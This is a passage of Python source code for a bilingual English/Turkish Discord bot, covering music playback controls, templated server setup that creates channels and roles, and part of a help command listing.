    # Temizlik
    if guild_id in music_queues:
        del music_queues[guild_id]
    if guild_id in now_playing:
        del now_playing[guild_id]
    if guild_id in music_loop:
        del music_loop[guild_id]
    
    await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)

@bot.tree.command(name="volume", description="Set music volume (1-100)")
async def set_volume(interaction: discord.Interaction, volume: int):
    """Set music volume"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if volume < 1 or volume > 100:
        await interaction.response.send_message("Volume must be between 1 and 100.", ephemeral=True)
        return
    
    # Note: Volume adjustment would need FFmpeg filter modification
    # This is a placeholder for volume control implementation
    await interaction.response.send_message(f"Volume set to {volume}%. Note: Full volume control requires advanced audio processing setup.", ephemeral=True)

@bot.tree.command(name="ses", description="Müzik ses seviyesini ayarla (1-100)")
async def set_ses(interaction: discord.Interaction, ses: int):
    """Müzik ses seviyesini ayarla"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    if ses < 1 or ses > 100:
        await interaction.response.send_message("Ses seviyesi 1 ile 100 arasında olmalı.", ephemeral=True)
        return
    
    await interaction.response.send_message(f"Ses seviyesi {ses}% olarak ayarlandı. Not: Tam ses kontrolü için gelişmiş ses işleme kurulumu gereklidir.", ephemeral=True)

# Music Menu Command
class MusicMenuView(discord.ui.View):
    """Music control menu"""
    def __init__(self, lang: str = "en"):
        super().__init__(timeout=None)
        self.lang = lang
    
    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary, row=0)
    async def pause_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
            if self.lang == "en":
                await interaction.response.send_message("No music is playing.", ephemeral=True)
            else:
                await interaction.response.send_message("Çalan bir müzik yok.", ephemeral=True)
            return
        
        interaction.guild.voice_client.pause()
        if self.lang == "en":
            await interaction.response.send_message("Music paused.", ephemeral=True)
        else:
            await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)
    
    @discord.ui.button(label="▶️ Resume", style=discord.ButtonStyle.secondary, row=0)
    async def resume_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
            if self.lang == "en":
                await interaction.response.send_message("No music is paused.", ephemeral=True)
            else:
                await interaction.response.send_message("Duraklatılmış bir müzik yok.", ephemeral=True)
            return
        
        interaction.guild.voice_client.resume()
        if self.lang == "en":
            await interaction.response.send_message("Music resumed.", ephemeral=True)
        else:
            await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)
    
    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.primary, row=0)
    async def skip_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
            if self.lang == "en":
                await interaction.response.send_message("No music to skip.", ephemeral=True)
            else:
                await interaction.response.send_message("Atlanacak müzik yok.", ephemeral=True)
            return
        
        interaction.guild.voice_client.stop()
        if self.lang == "en":
            await interaction.response.send_message("Skipped current song.", ephemeral=True)
        else:
            await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)
    
    @discord.ui.button(label="🔁 Loop", style=discord.ButtonStyle.success, row=1)
    async def loop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        
        if guild_id not in music_loop:
            music_loop[guild_id] = False
        
        music_loop[guild_id] = not music_loop[guild_id]
        
        if music_loop[guild_id]:
            if self.lang == "en":
                await interaction.response.send_message("Loop enabled. Current queue will repeat.", ephemeral=True)
            else:
                await interaction.response.send_message("Döngü etkinleştirildi. Mevcut sıra tekrarlanacak.", ephemeral=True)
        else:
            if self.lang == "en":
                await interaction.response.send_message("Loop disabled.", ephemeral=True)
            else:
                await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)
    
    @discord.ui.button(label="⏹️ Stop", style=discord.ButtonStyle.danger, row=1)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not interaction.guild.voice_client:
            if self.lang == "en":
                await interaction.response.send_message("Not connected to voice channel.", ephemeral=True)
            else:
                await interaction.response.send_message("Ses kanalına bağlı değil.", ephemeral=True)
            return
        
        # Clear queue
        guild_id = interaction.guild.id
        if guild_id in music_queues:
            music_queues[guild_id].clear()
        
        # Stop playback
        interaction.guild.voice_client.stop()
        
        # Disconnect
        await interaction.guild.voice_client.disconnect()
        
        # Clean up
        if guild_id in music_queues:
            del music_queues[guild_id]
        if guild_id in now_playing:
            del now_playing[guild_id]
        if guild_id in music_loop:
            del music_loop[guild_id]
        
        if self.lang == "en":
            await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)
        else:
            await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)
    
    @discord.ui.button(label="📜 Queue", style=discord.ButtonStyle.secondary, row=2)
    async def queue_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        
        if guild_id not in music_queues or not music_queues[guild_id]:
            if self.lang == "en":
                await interaction.response.send_message("Queue is empty.", ephemeral=True)
            else:
                await interaction.response.send_message("Sıra boş.", ephemeral=True)
            return
        
        queue_list = music_queues[guild_id]
        current = now_playing.get(guild_id)
        
        if self.lang == "en":
            embed = discord.Embed(title="🎵 Music Queue", color=discord.Color.blue())
        else:
            embed = discord.Embed(title="🎵 Müzik Sırası", color=discord.Color.blue())
        
        if current:
            if self.lang == "en":
                embed.add_field(name="Now Playing", value=f"**{current['title']}**\nDuration: {format_duration(current['duration'])}\nRequested by: {current['requester'].mention}", inline=False)
            else:
                embed.add_field(name="Şimdi Çalıyor", value=f"**{current['title']}**\nSüre: {format_duration(current['duration'])}\nİsteyen: {current['requester'].mention}", inline=False)
        
        if queue_list:
            queue_text = ""
            for i, track in enumerate(queue_list[:10], 1):
                if self.lang == "en":
                    queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (Requested by: {track['requester'].mention})\n"
                else:
                    queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (İsteyen: {track['requester'].mention})\n"
            
            if len(queue_list) > 10:
                if self.lang == "en":
                    queue_text += f"\n...and {len(queue_list) - 10} more tracks."
                else:
                    queue_text += f"\n...ve {len(queue_list) - 10} şarkı daha."
            
            if self.lang == "en":
                embed.add_field(name="Up Next", value=queue_text, inline=False)
            else:
                embed.add_field(name="Sıradaki", value=queue_text, inline=False)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="music-menu", description="Open music control menu")
async def music_menu(interaction: discord.Interaction):
    """Open music control menu"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    embed = discord.Embed(
        title="🎵 Music Control Menu",
        description="Use the buttons below to control music playback.",
        color=discord.Color.blue()
    )
    
    view = MusicMenuView(lang="en")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="müzik-menüsü", description="Müzik kontrol menüsünü aç")
async def müzik_menüsü(interaction: discord.Interaction):
    """Müzik kontrol menüsünü aç"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    embed = discord.Embed(
        title="🎵 Müzik Kontrol Menüsü",
        description="Müzik çalmayı kontrol etmek için aşağıdaki butonları kullanın.",
        color=discord.Color.blue()
    )
    
    view = MusicMenuView(lang="tr")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# Server Setup Command (Enhanced)
class ServerSetupView(discord.ui.View):
    """View for server setup options"""
    def __init__(self, lang: str = "en"):
        super().__init__(timeout=180)
        self.lang = lang
    
    @discord.ui.button(label="📋 Basic Setup", style=discord.ButtonStyle.primary, row=0)
    async def basic_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await setup_basic_channels(interaction, self.lang)
    
    @discord.ui.button(label="🎮 Gaming Setup", style=discord.ButtonStyle.primary, row=0)
    async def gaming_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await setup_gaming_channels(interaction, self.lang)
    
    @discord.ui.button(label="💼 Business Setup", style=discord.ButtonStyle.primary, row=0)
    async def business_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await setup_business_channels(interaction, self.lang)
    
    @discord.ui.button(label="🎵 Music Setup", style=discord.ButtonStyle.primary, row=1)
    async def music_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await setup_music_channels(interaction, self.lang)
    
    @discord.ui.button(label="🎭 Community Setup", style=discord.ButtonStyle.primary, row=1)
    async def community_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await setup_community_channels(interaction, self.lang)
    
    @discord.ui.button(label="🔧 Custom Setup", style=discord.ButtonStyle.secondary, row=2)
    async def custom_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await show_custom_setup_modal(interaction, self.lang)

async def setup_basic_channels(interaction: discord.Interaction, lang: str):
    """Create basic server channels"""
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Create category
    category_name = "📁・TEXT CHANNELS" if lang == "en" else "📁・METİN KANALLARI"
    category = await guild.create_category(category_name)
    
    # Create basic channels
    channels = [
        ("📢・announcements", "Server announcements"),
        ("📜・rules", "Server rules"),
        ("💬・general", "General chat"),
        ("🤖・commands", "Bot commands"),
        ("🎮・gaming", "Gaming chat"),
        ("📸・media", "Share your media"),
        ("🔊・voice-chat", "Voice chat")
    ]
    
    if lang == "tr":
        channels = [
            ("📢・duyurular", "Sunucu duyuruları"),
            ("📜・kurallar", "Sunucu kuralları"),
            ("💬・genel", "Genel sohbet"),
            ("🤖・komutlar", "Bot komutları"),
            ("🎮・oyun", "Oyun sohbeti"),
            ("📸・medya", "Medya paylaşımı"),
            ("🔊・ses-sohbet", "Ses sohbeti")
        ]
    
    created_channels = []
    for name, topic in channels:
        channel = await category.create_text_channel(name, topic=topic)
        created_channels.append(channel.mention)
    
    # Create voice category
    voice_category_name = "🔊・VOICE CHANNELS" if lang == "en" else "🔊・SES KANALLARI"
    voice_category = await guild.create_category(voice_category_name)
    
    # Create voice channels
    voice_channels = ["General VC", "Gaming VC", "Chill VC"]
    if lang == "tr":
        voice_channels = ["Genel Ses", "Oyun Ses", "Rahat Ses"]
    
    for vc_name in voice_channels:
        await voice_category.create_voice_channel(vc_name)
    
    # Create roles
    roles = ["Admin", "Moderator", "Member", "VIP"]
    if lang == "tr":
        roles = ["Yönetici", "Moderatör", "Üye", "VIP"]
    
    created_roles = []
    for role_name in roles:
        role = await guild.create_role(name=role_name)
        created_roles.append(role.name)
    
    # Send summary
    embed = discord.Embed(
        title="✅ Basic Setup Complete" if lang == "en" else "✅ Temel Kurulum Tamamlandı",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Created Categories" if lang == "en" else "Oluşturulan Kategoriler",
        value=f"• {category.name}\n• {voice_category.name}",
        inline=False
    )
    embed.add_field(
        name="Created Channels" if lang == "en" else "Oluşturulan Kanallar",
        value="\n".join(created_channels),
        inline=False
    )
    embed.add_field(
        name="Created Roles" if lang == "en" else "Oluşturulan Roller",
        value=", ".join(created_roles),
        inline=False
    )
    embed.add_field(
        name="Next Steps" if lang == "en" else "Sonraki Adımlar",
        value=(
            "1. Set up permissions for each role\n"
            "2. Configure channel permissions\n"
            "3. Set up verification system\n"
            "4. Add welcome message"
        ) if lang == "en" else (
            "1. Her rol için izinleri ayarlayın\n"
            "2. Kanal izinlerini yapılandırın\n"
            "3. Doğrulama sistemini kurun\n"
            "4. Karşılama mesajı ekleyin"
        ),
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

async def setup_gaming_channels(interaction: discord.Interaction, lang: str):
    """Create gaming-focused server channels"""
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Create gaming category
    category_name = "🎮・GAMING" if lang == "en" else "🎮・OYUN"
    category = await guild.create_category(category_name)
    
    # Create gaming channels
    channels = [
        ("🎮・general-gaming", "General gaming discussion"),
        ("📢・announcements", "Tournament announcements"),
        ("🏆・tournaments", "Tournament information"),
        ("🤝・looking-for-team", "Find teammates"),
        ("🎯・clips-and-highlights", "Share your epic moments"),
        ("💬・voice-chat-1", "Voice channel 1"),
        ("💬・voice-chat-2", "Voice channel 2"),
        ("🎙️・stream-announcements", "Stream announcements")
    ]
    
    if lang == "tr":
        channels = [
            ("🎮・genel-oyun", "Genel oyun tartışması"),
            ("📢・duyurular", "Turnuva duyuruları"),
            ("🏆・turnuvalar", "Turnuva bilgileri"),
            ("🤝・takım-ara", "Takım arkadaşı bul"),
            ("🎯・klipler-ve-anlar", "Epik anlarını paylaş"),
            ("💬・ses-sohbet-1", "Ses kanalı 1"),
            ("💬・ses-sohbet-2", "Ses kanalı 2"),
            ("🎙️・yayın-duyuruları", "Yayın duyuruları")
        ]
    
    created_channels = []
    for name, topic in channels:
        if "voice" in name or "ses" in name:
            channel = await category.create_voice_channel(name.replace("💬・", "").replace("・", "-"))
        else:
            channel = await category.create_text_channel(name, topic=topic)
        created_channels.append(channel.mention if hasattr(channel, 'mention') else channel.name)
    
    # Create game-specific categories
    games = ["VALORANT", "League of Legends", "CS:GO", "Minecraft", "Fortnite"]
    
    for game in games:
        game_category = await guild.create_category(f"🎮・{game}")
        await game_category.create_text_channel(f"💬・{game.lower().replace(' ', '-')}-chat")
        await game_category.create_text_channel(f"📢・{game.lower().replace(' ', '-')}-announcements")
        await game_category.create_voice_channel(f"🔊・{game.lower().replace(' ', '-')}-voice")
    
    # Create gaming roles
    roles = ["Pro Player", "Streamer", "Tournament Organizer", "Coach", "Casual Gamer"]
    if lang == "tr":
        roles = ["Profesyonel Oyuncu", "Yayıncı", "Turnuva Organizatörü", "Koç", "Sıradan Oyuncu"]
    
    created_roles = []
    for role_name in roles:
        role = await guild.create_role(name=role_name)
        created_roles.append(role.name)
    
    # Send summary
    embed = discord.Embed(
        title="✅ Gaming Setup Complete" if lang == "en" else "✅ Oyun Kurulumu Tamamlandı",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Main Categories" if lang == "en" else "Ana Kategoriler",
        value=f"• {category.name}\n• 5 Game-specific categories",
        inline=False
    )
    embed.add_field(
        name="Gaming Channels" if lang == "en" else "Oyun Kanalları",
        value="\n".join(created_channels[:5]) + "\n...",
        inline=False
    )
    embed.add_field(
        name="Gaming Roles" if lang == "en" else "Oyun Rolleri",
        value=", ".join(created_roles),
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

async def setup_business_channels(interaction: discord.Interaction, lang: str):
    """Create business-focused server channels"""
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Create business category
    category_name = "💼・BUSINESS" if lang == "en" else "💼・İŞ"
    category = await guild.create_category(category_name)
    
    # Create business channels
    channels = [
        ("📢・announcements", "Company announcements"),
        ("📋・projects", "Project discussions"),
        ("🤝・meetings", "Meeting schedules"),
        ("📊・reports", "Business reports"),
        ("💡・ideas", "Share your ideas"),
        ("🎯・goals", "Company goals"),
        ("📈・progress", "Progress tracking"),
        ("🔒・confidential", "Confidential discussions")
    ]
    
    if lang == "tr":
        channels = [
            ("📢・duyurular", "Şirket duyuruları"),
            ("📋・projeler", "Proje tartışmaları"),
            ("🤝・toplantılar", "Toplantı programları"),
            ("📊・raporlar", "İş raporları"),
            ("💡・fikirler", "Fikirlerinizi paylaşın"),
            ("🎯・hedefler", "Şirket hedefleri"),
            ("📈・ilerleme", "İlerleme takibi"),
            ("🔒・gizli", "Gizli tartışmalar")
        ]
    
    created_channels = []
    for name, topic in channels:
        channel = await category.create_text_channel(name, topic=topic)
        created_channels.append(channel.mention)
    
    # Create department categories
    departments = ["HR", "Marketing", "Development", "Sales", "Support"]
    if lang == "tr":
        departments = ["İK", "Pazarlama", "Geliştirme", "Satış", "Destek"]
    
    for dept in departments:
        dept_category = await guild.create_category(f"🏢・{dept}")
        await dept_category.create_text_channel(f"💬・{dept.lower()}-chat")
        await dept_category.create_text_channel(f"📁・{dept.lower()}-files")
        await dept_category.create_voice_channel(f"🗣️・{dept.lower()}-meetings")
    
    # Create business roles
    roles = ["CEO", "Manager", "Team Lead", "Employee", "Intern"]
    if lang == "tr":
        roles = ["CEO", "Yönetici", "Takım Lideri", "Çalışan", "Stajyer"]
    
    created_roles = []
    for role_name in roles:
        role = await guild.create_role(name=role_name)
        created_roles.append(role.name)
    
    # Send summary
    embed = discord.Embed(
        title="✅ Business Setup Complete" if lang == "en" else "✅ İş Kurulumu Tamamlandı",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Main Categories" if lang == "en" else "Ana Kategoriler",
        value=f"• {category.name}\n• 5 Department categories",
        inline=False
    )
    embed.add_field(
        name="Business Channels" if lang == "en" else "İş Kanalları",
        value="\n".join(created_channels[:5]) + "\n...",
        inline=False
    )
    embed.add_field(
        name="Business Roles" if lang == "en" else "İş Rolleri",
        value=", ".join(created_roles),
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

async def setup_music_channels(interaction: discord.Interaction, lang: str):
    """Create music-focused server channels"""
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Create music category
    category_name = "🎵・MUSIC" if lang == "en" else "🎵・MÜZİK"
    category = await guild.create_category(category_name)
    
    # Create music channels
    channels = [
        ("🎶・music-chat", "Discuss music"),
        ("🎧・recommendations", "Music recommendations"),
        ("🎸・genres", "Genre discussions"),
        ("🎤・karaoke", "Karaoke sessions"),
        ("📻・radio", "Radio station"),
        ("🎼・lyrics", "Share lyrics"),
        ("🎹・instruments", "Instrument discussions"),
        ("🎚️・music-production", "Music production")
    ]
    
    if lang == "tr":
        channels = [
            ("🎶・müzik-sohbet", "Müzik tartışması"),
            ("🎧・öneriler", "Müzik önerileri"),
            ("🎸・türler", "Tür tartışmaları"),
            ("🎤・karaoke", "Karaoke seansları"),
            ("📻・radyo", "Radyo istasyonu"),
            ("🎼・şarkı-sözleri", "Şarkı sözleri paylaşımı"),
            ("🎹・enstrümanlar", "Enstrüman tartışmaları"),
            ("🎚️・müzik-yapımı", "Müzik yapımı")
        ]
    
    created_channels = []
    for name, topic in channels:
        channel = await category.create_text_channel(name, topic=topic)
        created_channels.append(channel.mention)
    
    # Create voice channels for music
    voice_channels = ["🎵・Lounge", "🎶・Chill", "🎸・Rock", "🎤・Karaoke", "🎧・Party"]
    if lang == "tr":
        voice_channels = ["🎵・Lounge", "🎶・Rahat", "🎸・Rock", "🎤・Karaoke", "🎧・Parti"]
    
    for vc_name in voice_channels:
        await category.create_voice_channel(vc_name)
    
    # Create genre roles
    genres = ["Rock", "Pop", "Hip-Hop", "Jazz", "Classical", "Electronic", "Metal", "Indie"]
    
    created_roles = []
    for genre in genres:
        role = await guild.create_role(name=f"🎵 {genre}")
        created_roles.append(role.name)
    
    # Send summary
    embed = discord.Embed(
        title="✅ Music Setup Complete" if lang == "en" else "✅ Müzik Kurulumu Tamamlandı",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Music Category" if lang == "en" else "Müzik Kategorisi",
        value=category.name,
        inline=False
    )
    embed.add_field(
        name="Text Channels" if lang == "en" else "Metin Kanalları",
        value="\n".join(created_channels[:4]) + "\n...",
        inline=False
    )
    embed.add_field(
        name="Voice Channels" if lang == "en" else "Ses Kanalları",
        value="\n".join(voice_channels),
        inline=False
    )
    embed.add_field(
        name="Genre Roles" if lang == "en" else "Tür Rolleri",
        value=", ".join(created_roles[:6]) + "...",
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

async def setup_community_channels(interaction: discord.Interaction, lang: str):
    """Create community-focused server channels"""
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    # Create community category
    category_name = "🎭・COMMUNITY" if lang == "en" else "🎭・TOPLULUK"
    category = await guild.create_category(category_name)
    
    # Create community channels
    channels = [
        ("👋・introductions", "Introduce yourself"),
        ("🎉・events", "Community events"),
        ("📸・photos", "Share photos"),
        ("🎮・gaming", "Gaming together"),
        ("🎬・movies", "Movie discussions"),
        ("📚・books", "Book club"),
        ("🍳・cooking", "Cooking recipes"),
        ("🏋️・fitness", "Fitness challenges")
    ]
    
    if lang == "tr":
        channels = [
            ("👋・tanışma", "Kendinizi tanıtın"),
            ("🎉・etkinlikler", "Topluluk etkinlikleri"),
            ("📸・fotoğraflar", "Fotoğraf paylaşımı"),
            ("🎮・oyun", "Birlikte oyun"),
            ("🎬・filmler", "Film tartışmaları"),
            ("📚・kitaplar", "Kitap kulübü"),
            ("🍳・yemek", "Yemek tarifleri"),
            ("🏋️・fitness", "Fitness mücadelesi")
        ]
    
    created_channels = []
    for name, topic in channels:
        channel = await category.create_text_channel(name, topic=topic)
        created_channels.append(channel.mention)
    
    # Create voice channels
    voice_channels = ["🗣️・General", "🎮・Gaming", "🎬・Movie Night", "🎵・Music", "☕・Chill"]
    if lang == "tr":
        voice_channels = ["🗣️・Genel", "🎮・Oyun", "🎬・Film Gecesi", "🎵・Müzik", "☕・Rahat"]
    
    for vc_name in voice_channels:
        await category.create_voice_channel(vc_name)
    
    # Create community roles
    roles = ["Event Organizer", "Content Creator", "Helper", "Regular", "New Member"]
    if lang == "tr":
        roles = ["Etkinlik Organizatörü", "İçerik Üretici", "Yardımcı", "Düzenli", "Yeni Üye"]
    
    created_roles = []
    for role_name in roles:
        role = await guild.create_role(name=role_name)
        created_roles.append(role.name)
    
    # Send summary
    embed = discord.Embed(
        title="✅ Community Setup Complete" if lang == "en" else "✅ Topluluk Kurulumu Tamamlandı",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Community Category" if lang == "en" else "Topluluk Kategorisi",
        value=category.name,
        inline=False
    )
    embed.add_field(
        name="Community Channels" if lang == "en" else "Topluluk Kanalları",
        value="\n".join(created_channels[:4]) + "\n...",
        inline=False
    )
    embed.add_field(
        name="Voice Channels" if lang == "en" else "Ses Kanalları",
        value="\n".join(voice_channels),
        inline=False
    )
    embed.add_field(
        name="Community Roles" if lang == "en" else "Topluluk Rolleri",
        value=", ".join(created_roles),
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

class CustomSetupModal(discord.ui.Modal):
    """Modal for custom server setup"""
    def __init__(self, lang: str = "en"):
        self.lang = lang
        title = "Custom Server Setup" if lang == "en" else "Özel Sunucu Kurulumu"
        super().__init__(title=title)
        
        self.category_name = discord.ui.TextInput(
            label="Category Name" if lang == "en" else "Kategori Adı",
            placeholder="Enter category name..." if lang == "en" else "Kategori adını girin...",
            required=True
        )
        self.add_item(self.category_name)
        
        self.channel_names = discord.ui.TextInput(
            label="Channel Names (comma separated)" if lang == "en" else "Kanal Adları (virgülle ayrılmış)",
            placeholder="general, announcements, voice-chat" if lang == "en" else "genel, duyurular, ses-sohbet",
            required=True
        )
        self.add_item(self.channel_names)
        
        self.role_names = discord.ui.TextInput(
            label="Role Names (comma separated)" if lang == "en" else "Rol Adları (virgülle ayrılmış)",
            placeholder="Admin, Moderator, Member" if lang == "en" else "Yönetici, Moderatör, Üye",
            required=False
        )
        self.add_item(self.role_names)
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        guild = interaction.guild
        
        # Create category
        category = await guild.create_category(self.category_name.value)
        
        # Create channels
        channel_names = [name.strip() for name in self.channel_names.value.split(',')]
        created_channels = []
        
        for name in channel_names:
            if "voice" in name.lower() or "ses" in name.lower():
                channel = await category.create_voice_channel(name.strip())
            else:
                channel = await category.create_text_channel(name.strip())
            created_channels.append(channel.mention if hasattr(channel, 'mention') else channel.name)
        
        # Create roles if provided
        created_roles = []
        if self.role_names.value:
            role_names = [name.strip() for name in self.role_names.value.split(',')]
            for role_name in role_names:
                role = await guild.create_role(name=role_name)
                created_roles.append(role.name)
        
        # Send summary
        embed = discord.Embed(
            title="✅ Custom Setup Complete" if self.lang == "en" else "✅ Özel Kurulum Tamamlandı",
            color=discord.Color.green()
        )
        embed.add_field(
            name="Category" if self.lang == "en" else "Kategori",
            value=category.name,
            inline=False
        )
        embed.add_field(
            name="Channels" if self.lang == "en" else "Kanallar",
            value="\n".join(created_channels),
            inline=False
        )
        if created_roles:
            embed.add_field(
                name="Roles" if self.lang == "en" else "Roller",
                value=", ".join(created_roles),
                inline=False
            )
        
        await interaction.followup.send(embed=embed, ephemeral=True)

async def show_custom_setup_modal(interaction: discord.Interaction, lang: str):
    """Show custom setup modal"""
    modal = CustomSetupModal(lang)
    await interaction.response.send_modal(modal)

@bot.tree.command(name="server-setup", description="Setup your server with pre-configured templates")
async def server_setup(interaction: discord.Interaction):
    """Setup your server with pre-configured templates"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    # Check permissions
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command.", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="🏗️ Server Setup",
        description="Choose a setup template for your server:",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="📋 Basic Setup",
        value="Creates essential channels and roles for a new server.",
        inline=False
    )
    embed.add_field(
        name="🎮 Gaming Setup",
        value="Creates gaming-focused channels, categories, and roles.",
        inline=False
    )
    embed.add_field(
        name="💼 Business Setup",
        value="Creates professional channels for business use.",
        inline=False
    )
    embed.add_field(
        name="🎵 Music Setup",
        value="Creates music-focused channels and genre roles.",
        inline=False
    )
    embed.add_field(
        name="🎭 Community Setup",
        value="Creates community-focused channels for engagement.",
        inline=False
    )
    embed.add_field(
        name="🔧 Custom Setup",
        value="Create your own custom setup with specific channels.",
        inline=False
    )
    embed.set_footer(text="This may take a few moments to complete.")
    
    view = ServerSetupView(lang="en")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="sunucu-kurulumu", description="Sunucunuzu önceden yapılandırılmış şablonlarla kurun")
async def sunucu_kurulumu(interaction: discord.Interaction):
    """Sunucunuzu önceden yapılandırılmış şablonlarla kurun"""
    # Check verification
    if not await check_verification(interaction):
        return
    
    # Check permissions
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("Bu komutu kullanmak için yönetici izinlerine ihtiyacınız var.", ephemeral=True)
        return
    
    embed = discord.Embed(
        title="🏗️ Sunucu Kurulumu",
        description="Sunucunuz için bir kurulum şablonu seçin:",
        color=discord.Color.blue()
    )
    embed.add_field(
        name="📋 Temel Kurulum",
        value="Yeni bir sunucu için temel kanallar ve roller oluşturur.",
        inline=False
    )
    embed.add_field(
        name="🎮 Oyun Kurulumu",
        value="Oyun odaklı kanallar, kategoriler ve roller oluşturur.",
        inline=False
    )
    embed.add_field(
        name="💼 İş Kurulumu",
        value="İş kullanımı için profesyonel kanallar oluşturur.",
        inline=False
    )
    embed.add_field(
        name="🎵 Müzik Kurulumu",
        value="Müzik odaklı kanallar ve tür rolleri oluşturur.",
        inline=False
    )
    embed.add_field(
        name="🎭 Topluluk Kurulumu",
        value="Katılım için topluluk odaklı kanallar oluşturur.",
        inline=False
    )
    embed.add_field(
        name="🔧 Özel Kurulum",
        value="Belirli kanallarla kendi özel kurulumunuzu oluşturun.",
        inline=False
    )
    embed.set_footer(text="Bu işlemin tamamlanması birkaç dakika sürebilir.")
    
    view = ServerSetupView(lang="tr")
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

# Help Command with all features
@bot.tree.command(name="help", description="Show all available commands")
async def help_command(interaction: discord.Interaction):
    """Show all available commands"""
    embed = discord.Embed(
        title="🤖 Bot Help - Available Commands",
        description="Here are all the commands you can use:",
        color=discord.Color.blue()
    )
    
    # Music Commands
    embed.add_field(
        name="🎵 Music Commands",
        value=(
            "`/play <url>` - Play music from URL\n"
            "`/pause` - Pause current music\n"
            "`/resume` - Resume paused music\n"
            "`/skip` - Skip current song\n"
            "`/queue` - Show music queue\n"
            "`/loop` - Toggle queue loop\n"
            "`/stop` - Stop music and disconnect\n"
            "`/volume <1-100>` - Set volume\n"
            "`/music-menu` - Music control menu\n"
        ),
        inline=False
    )
    
    # Server Setup Commands
    embed.add_field(
        name="🏗️ Server Setup Commands",
        value=(
            "`/server-setup` - Setup server with templates\n"
            "`/sunucu-kurulumu` - Sunucu kurulum şablonları\n"
        ),
        inline=False
    )
    
    # Notification Commands
    embed.add_field(
        name="📢 Notification Commands",
        value=(
            "`/twitch-notification-channel-setup` - Twitch notifications\n"
            "`/kick-notification-channel-setup` - Kick notifications\n"
            "`/youtube-notification-channel-setup` - YouTube notifications\n"
            "`/twitch-bildirim-kanalı-kurulum` - Twitch bildirimleri\n"
            "`/kick-bildirim-kanalı-kurulum` - Kick bildirimleri\n"
            "`/youtube-bildirim-kanalı-kurulum` - YouTube bildirimleri\n"
        ),
        inline=False
    )
    
    # Feedback Commands
    embed.add_field(
        name="📩 Feedback Commands",
        value=(
            "`/feedback` - Send feedback to bot owner\n"
            "`/geri-bildirim` - Bot sahibine geri bildirim gönder\n"
            "`/feedback-read <id> <message>` - Respond to feedback (Owner)\n"
            "`/geri-bildirim-okundu <id> <mesaj>` - Geri bildirime yanıt ver (Sahip)\n"
            "`/write-dm <user_id> <message>` - Send DM to user (Owner)\n"
            "`/dm-yaz <kullanıcı_id> <mesaj>` - Kullanıcıya DM gönder (Sahip)\n"
        ),
        inline=False
    )
    
    # Verification Commands
    embed.add_field(
        name="🔐 Verification Commands",
        value=(
            "`/verify` - Complete verification\n"
            "`/doğrula` - Doğrulama yap\n"
        ),
        inline=False
    )
    
    # AI Commands
    embed.add_field(
        name="🤖 AI Commands",
        value=(
            "`/ai-info` - AI service information\n"
            "`/ai-bilgi` - AI hizmeti bilgileri\n"
        ),
        inline=False
    )
    
    # Owner Commands
    embed.add_field(
        name="⚙️ Owner Commands",
        value=(
            "`/feedback-ban <user_id> <time>` - Ban from feedback\n"
            "`/geri-bildirim-engelle <kullanıcı_id> <süre>` - Geri bildirimden engelle\n"
            "`/reset-bot` - Reset bot data\n"
